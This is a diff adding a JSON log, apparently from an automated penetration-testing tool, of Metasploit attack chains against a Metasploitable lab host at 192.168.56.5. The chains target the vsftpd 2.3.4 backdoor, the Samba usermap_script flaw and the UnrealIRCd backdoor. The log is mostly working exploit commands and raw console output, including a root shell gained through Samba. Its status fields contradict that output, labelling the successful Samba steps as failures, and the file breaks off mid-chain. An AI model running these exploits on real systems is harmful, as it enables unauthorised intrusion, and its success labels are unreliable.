@@ -1,0 +1,413 @@
+{
+    "target": "192.168.56.5",
+    "attack_chains": {
+        "Chain 1: vsftpd Backdoor to Root Persistence": {
+            "initial_access": [
+                {
+                    "description": "Exploit vsftpd 2.3.4 backdoor on port 21 to gain root shell using bind payload",
+                    "command": "msfconsole -q",
+                    "command_type": "start_session",
+                    "raw_output": "Persistent session 'vsftpd_session' started",
+                    "analysis": "Type: start_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd 2.3.4 backdoor on port 21 to gain root shell using bind payload",
+                    "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd 2.3.4 backdoor on port 21 to gain root shell using bind payload",
+                    "command": "set RHOSTS 192.168.56.5",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd 2.3.4 backdoor on port 21 to gain root shell using bind payload",
+                    "command": "set RPORT 21",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21\nRPORT => 21\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd 2.3.4 backdoor on port 21 to gain root shell using bind payload",
+                    "command": "set PAYLOAD cmd/unix/bind_perl",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21\nRPORT => 21\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/bind_perl\n[-] The value specified for PAYLOAD is not valid.\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd 2.3.4 backdoor on port 21 to gain root shell using bind payload",
+                    "command": "set LPORT 4444",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21\nRPORT => 21\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/bind_perl\n[-] The value specified for PAYLOAD is not valid.\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set LPORT 4444\n[!] Unknown datastore option: LPORT. Did you mean RPORT?\nLPORT => 4444\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd 2.3.4 backdoor on port 21 to gain root shell using bind payload",
+                    "command": "exploit -j",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21\nRPORT => 21\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/bind_perl\n[-] The value specified for PAYLOAD is not valid.\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set LPORT 4444\n[!] Unknown datastore option: LPORT. Did you mean RPORT?\nLPORT => 4444\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n[*] 192.168.56.5:21 - The port used by the backdoor bind listener is already ope\nn\n[-] 192.168.56.5:21 - The service on port 6200 does not appear to be a shell\n\n\n\n\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Exploit vsftpd 2.3.4 backdoor on port 21 to gain root shell using bind payload",
+                    "command": "sessions -l",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21\nRPORT => 21\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/bind_perl\n[-] The value specified for PAYLOAD is not valid.\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set LPORT 4444\n[!] Unknown datastore option: LPORT. Did you mean RPORT?\nLPORT => 4444\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n[*] 192.168.56.5:21 - The port used by the backdoor bind listener is already ope\nn\n[-] 192.168.56.5:21 - The service on port 6200 does not appear to be a shell\nsessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                }
+            ],
+            "privilege_escalation": [
+                {
+                    "description": "Verify root privileges from backdoor shell",
+                    "command": "sessions -i 1 -c 'id'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21\nRPORT => 21\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/bind_perl\n[-] The value specified for PAYLOAD is not valid.\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set LPORT 4444\n[!] Unknown datastore option: LPORT. Did you mean RPORT?\nLPORT => 4444\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n[*] 192.168.56.5:21 - The port used by the backdoor bind listener is already ope\nn\n[-] 192.168.56.5:21 - The service on port 6200 does not appear to be a shell\nsessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'id'\n[-] Invalid session identifier: 1\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Session does not exist",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Session does not exist"
+                },
+                {
+                    "description": "Verify root privileges from backdoor shell",
+                    "command": "sessions -i 1 -c 'whoami'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/ftp/vsftpd_234_backdoor\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21\nRPORT => 21\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/bind_perl\n[-] The value specified for PAYLOAD is not valid.\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set LPORT 4444\n[!] Unknown datastore option: LPORT. Did you mean RPORT?\nLPORT => 4444\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n[*] 192.168.56.5:21 - The port used by the backdoor bind listener is already ope\nn\n[-] 192.168.56.5:21 - The service on port 6200 does not appear to be a shell\nsessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'id'\n[-] Invalid session identifier: 1\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'whoami'\n[-] Invalid session identifier: 1\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Session does not exist",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Session does not exist"
+                }
+            ],
+            "overall_status": "partial",
+            "furthest_stage": "initial_access",
+            "notes": []
+        },
+        "Chain 2: Samba Usermap Script to Root Persistence": {
+            "initial_access": [
+                {
+                    "description": "Exploit Samba usermap_script (CVE-2007-2447) on port 445 to gain root shell using bind payload",
+                    "command": "msfconsole -q",
+                    "command_type": "start_session",
+                    "raw_output": "Persistent session 'samba_session' started",
+                    "analysis": "Type: start_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba usermap_script (CVE-2007-2447) on port 445 to gain root shell using bind payload",
+                    "command": "use exploit/multi/samba/usermap_script",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba usermap_script (CVE-2007-2447) on port 445 to gain root shell using bind payload",
+                    "command": "set RHOSTS 192.168.56.5",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba usermap_script (CVE-2007-2447) on port 445 to gain root shell using bind payload",
+                    "command": "set RPORT 445",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) > set RPORT 445\nRPORT => 445\nmsf exploit(multi/samba/usermap_script) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba usermap_script (CVE-2007-2447) on port 445 to gain root shell using bind payload",
+                    "command": "set PAYLOAD cmd/unix/bind_perl",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) > set RPORT 445\nRPORT => 445\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/bind_perl\nPAYLOAD => cmd/unix/bind_perl\nmsf exploit(multi/samba/usermap_script) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba usermap_script (CVE-2007-2447) on port 445 to gain root shell using bind payload",
+                    "command": "set LPORT 4445",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) > set RPORT 445\nRPORT => 445\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/bind_perl\nPAYLOAD => cmd/unix/bind_perl\nmsf exploit(multi/samba/usermap_script) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/samba/usermap_script) >\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba usermap_script (CVE-2007-2447) on port 445 to gain root shell using bind payload",
+                    "command": "exploit -j",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) > set RPORT 445\nRPORT => 445\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/bind_perl\nPAYLOAD => cmd/unix/bind_perl\nmsf exploit(multi/samba/usermap_script) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/samba/usermap_script) >\n[*] Started bind TCP handler against 192.168.56.5:4445\n[*] Command shell session 1 opened (192.168.56.2:40409 -> 192.168.56.5:4445) at\n2025-12-10 03:38:54 -0500\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Exploit Samba usermap_script (CVE-2007-2447) on port 445 to gain root shell using bind payload",
+                    "command": "sessions -l",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) > set RPORT 445\nRPORT => 445\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/bind_perl\nPAYLOAD => cmd/unix/bind_perl\nmsf exploit(multi/samba/usermap_script) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/samba/usermap_script) >\n[*] Started bind TCP handler against 192.168.56.5:4445\n[*] Command shell session 1 opened (192.168.56.2:40409 -> 192.168.56.5:4445) at\n2025-12-10 03:38:54 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               192.168.56.2:40409 -> 192.168.56.5:44\n                                         45 (192.168.56.5)\n\nmsf exploit(multi/samba/usermap_script) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                }
+            ],
+            "privilege_escalation": [
+                {
+                    "description": "Verify root privileges from Samba exploit shell",
+                    "command": "sessions -i 1 -c 'id'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) > set RPORT 445\nRPORT => 445\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/bind_perl\nPAYLOAD => cmd/unix/bind_perl\nmsf exploit(multi/samba/usermap_script) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/samba/usermap_script) >\n[*] Started bind TCP handler against 192.168.56.5:4445\n[*] Command shell session 1 opened (192.168.56.2:40409 -> 192.168.56.5:4445) at\n2025-12-10 03:38:54 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               192.168.56.2:40409 -> 192.168.56.5:44\n                                         45 (192.168.56.5)\n\nmsf exploit(multi/samba/usermap_script) > sessions -i 1 -c 'id'\n[*] Running 'id' on shell session 1 (192.168.56.5)\n\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Verify root privileges from Samba exploit shell",
+                    "command": "sessions -i 1 -c 'whoami'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.5\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/samba/usermap_script) > set RPORT 445\nRPORT => 445\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/bind_perl\nPAYLOAD => cmd/unix/bind_perl\nmsf exploit(multi/samba/usermap_script) > set LPORT 4445\nLPORT => 4445\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/samba/usermap_script) >\n[*] Started bind TCP handler against 192.168.56.5:4445\n[*] Command shell session 1 opened (192.168.56.2:40409 -> 192.168.56.5:4445) at\n2025-12-10 03:38:54 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               192.168.56.2:40409 -> 192.168.56.5:44\n                                         45 (192.168.56.5)\n\nmsf exploit(multi/samba/usermap_script) > sessions -i 1 -c 'id'\n[*] Running 'id' on shell session 1 (192.168.56.5)\nsessions -i 1 -c 'whoami'\nuid=0(root) gid=0(root)\n\nmsf exploit(multi/samba/usermap_script) > sessions -i 1 -c 'whoami'\n\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                }
+            ],
+            "overall_status": "partial",
+            "furthest_stage": "initial_access",
+            "notes": []
+        },
+        "Chain 3: UnrealIRCd Backdoor to Root Persistence": {
+            "initial_access": [
+                {
+                    "description": "Exploit UnrealIRCd backdoor (CVE-2010-2075) on port 6667 to gain root shell using bind payload",
+                    "command": "msfconsole -q",
+                    "command_type": "start_session",
+                    "raw_output": "Persistent session 'irc_session' started",
+                    "analysis": "Type: start_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit UnrealIRCd backdoor (CVE-2010-2075) on port 6667 to gain root shell using bind payload",
+                    "command": "use exploit/unix/irc/unreal_ircd_3281_backdoor",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf > use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit UnrealIRCd backdoor (CVE-2010-2075) on port 6667 to gain root shell using bind payload",
+                    "command": "set RHOSTS 192.168.56.5",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf > use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit UnrealIRCd backdoor (CVE-2010-2075) on port 6667 to gain root shell using bind payload",
+                    "command": "set RPORT 6667",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf > use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit UnrealIRCd backdoor (CVE-2010-2075) on port 6667 to gain root shell using bind payload",
+                    "command": "set PAYLOAD cmd/unix/bind_perl",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf > use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/bind_perl\nPAYLOAD => cmd/unix/bind_perl\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit UnrealIRCd backdoor (CVE-2010-2075) on port 6667 to gain root shell using bind payload",
+                    "command": "set LPORT 4446",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf > use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/bind_perl\nPAYLOAD => cmd/unix/bind_perl\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4446\nLPORT => 4446\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit UnrealIRCd backdoor (CVE-2010-2075) on port 6667 to gain root shell using bind payload",
+                    "command": "exploit -j",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf > use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/bind_perl\nPAYLOAD => cmd/unix/bind_perl\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4446\nLPORT => 4446\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n[*] 192.168.56.5:6667 - Connected to 192.168.56.5:6667...\n    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\n    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; usi\nng your IP address instead\n[*] 192.168.56.5:6667 - Sending backdoor command...\n[*] Started bind TCP handler against 192.168.56.5:4446\n\n\n\n\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Exploit UnrealIRCd backdoor (CVE-2010-2075) on port 6667 to gain root shell using bind payload",
+                    "command": "sessions -l",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf > use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/bind_perl\nPAYLOAD => cmd/unix/bind_perl\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4446\nLPORT => 4446\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n[*] 192.168.56.5:6667 - Connected to 192.168.56.5:6667...\n    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\n    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; usi\nng your IP address instead\n[*] 192.168.56.5:6667 - Sending backdoor command...\n[*] Started bind TCP handler against 192.168.56.5:4446\nsessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                }
+            ],
+            "privilege_escalation": [
+                {
+                    "description": "Verify root privileges from IRC backdoor shell",
+                    "command": "sessions -i 1 -c 'id'",
+                    "command_type": "session_command",
